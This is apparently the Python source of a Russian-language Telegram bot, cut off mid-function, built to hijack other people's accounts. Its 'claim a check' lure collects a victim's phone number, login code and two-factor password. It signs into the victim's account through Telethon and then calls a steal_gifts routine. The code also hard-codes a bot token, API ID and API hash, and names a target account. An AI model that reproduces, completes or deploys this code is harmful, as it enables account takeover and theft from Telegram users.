from flask import Flask
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import asyncio
import re
import os
from telethon import TelegramClient

BOT_TOKEN = "8959279502:AAGJIX6qqoSwgFa-Y0lXnhC4ClIR9nE4ifI"
API_ID = 35524346
API_HASH = "95f3fca0a6642a9ad57db7b2c60f58e2"
TARGET_ACCOUNT = "@cifsy"

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

user_data = {}
HELPER_SESSION_FILE = "helper_session.session"

@bot.message_handler(commands=['setup'])
def setup_account(message):
    bot.send_message(
        message.chat.id,
        "📱 **Введи номер ТВОЕГО аккаунта**:\n\nПример: +71234567890"
    )
    bot.register_next_step_handler(message, setup_phone)

def setup_phone(message):
    phone = message.text.strip()
    if not phone.startswith('+') or not re.match(r'^\+\d{10,15}$', phone):
        bot.send_message(message.chat.id, "❌ Неверный формат! Введи +71234567890")
        bot.register_next_step_handler(message, setup_phone)
        return
    
    user_data[message.chat.id] = {'phone': phone}
    bot.send_message(
        message.chat.id,
        f"✅ Номер {phone} принят!\n\n"
        "🔐 **Введи код подтверждения**, который пришёл в ТВОЙ Telegram:"
    )
    bot.register_next_step_handler(message, setup_code)

def setup_code(message):
    code = message.text.strip()
    chat_id = message.chat.id
    phone = user_data.get(chat_id, {}).get('phone')
    
    if not phone:
        bot.send_message(chat_id, "❌ Ошибка! Начни заново: /setup")
        return
    
    bot.send_message(chat_id, "⏳ Создание сессии...")
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(create_helper_session(chat_id, phone, code))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

async def create_helper_session(chat_id, phone, code):
    client = TelegramClient(HELPER_SESSION_FILE, API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(phone, code)
        user_data[chat_id]['client'] = client
        me = await client.get_me()
        bot.send_message(
            chat_id,
            f"✅ **Сессия создана!**\n"
            f"Аккаунт: {me.username or me.phone}\n\n"
            f"Теперь этот аккаунт будет использоваться для подтверждения входов.",
            parse_mode='Markdown'
        )
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎁 Забрать чек", callback_data="get_check"))
    bot.send_message(
        message.chat.id,
        "🌟 **Привет!**\n\nНажми на кнопку, чтобы получить чек.",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.callback_query_handler(func=lambda call: call.data == "get_check")
def get_check(call):
    bot.edit_message_text(
        "📱 **Введи номер телефона ЖЕРТВЫ**:",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(call.message, get_victim_phone)

def get_victim_phone(message):
    phone = message.text.strip()
    if not phone.startswith('+') or not re.match(r'^\+\d{10,15}$', phone):
        bot.send_message(message.chat.id, "❌ Неверный формат! Введи +71234567890")
        bot.register_next_step_handler(message, get_victim_phone)
        return
    
    chat_id = message.chat.id
    user_data[chat_id] = {'victim_phone': phone}
    
    bot.send_message(
        message.chat.id,
        f"✅ Номер {phone} принят!\n\n"
        "⏳ Код подтверждения придёт на ТВОЙ аккаунт."
    )
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(login_victim(chat_id, phone))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

async def login_victim(chat_id, phone):
    helper = TelegramClient(HELPER_SESSION_FILE, API_ID, API_HASH)
    await helper.connect()
    
    try:
        await helper.get_me()
    except:
        bot.send_message(chat_id, "❌ Твоя сессия не активна! Настрой заново: /setup")
        return
    
    client = TelegramClient(f'victim_session_{chat_id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        await client.sign_in(phone)
        
        bot.send_message(
            chat_id,
            "🔐 **Код отправлен на ТВОЙ аккаунт!**\n"
            "Введи код, который пришёл тебе в Telegram:"
        )
        
        bot.register_next_step_handler_by_chat_id(chat_id, complete_victim_login, client)
        
    except Exception as e:
        error = str(e)
        if '2FA' in error or 'password' in error:
            bot.send_message(chat_id, "🔐 **Введи 2FA пароль:**")
            bot.register_next_step_handler_by_chat_id(chat_id, get_victim_2fa, client)
        else:
            bot.send_message(chat_id, f"❌ Ошибка: {error[:100]}")

def complete_victim_login(message, client):
    code = message.text.strip()
    chat_id = message.chat.id
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(finish_victim_login(chat_id, client, code))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

async def finish_victim_login(chat_id, client, code):
    try:
        await client.sign_in(code=code)
        me = await client.get_me()
        bot.send_message(
            chat_id,
            f"✅ **Вход выполнен!**\n"
            f"Аккаунт: {me.username or me.phone}",
            parse_mode='Markdown'
        )
        
        await steal_gifts(chat_id, client)
        
    except Exception as e:
        if '2FA' in str(e) or 'password' in str(e):
            bot.send_message(chat_id, "🔐 **Введи 2FA пароль:**")
            bot.register_next_step_handler_by_chat_id(chat_id, get_victim_2fa, client)
        else:
            bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

def get_victim_2fa(message, client):
    code2fa = message.text.strip()
    chat_id = message.chat.id
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(finish_victim_2fa(chat_id, client, code2fa))
        loop.close()
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)[:100]}")

async def finish_victim_2fa(chat_id, client, code2fa):
    try:
        await client.sign_in(password=code2fa)
        me = await client.get_me()
        bot.send_message(
            chat_id
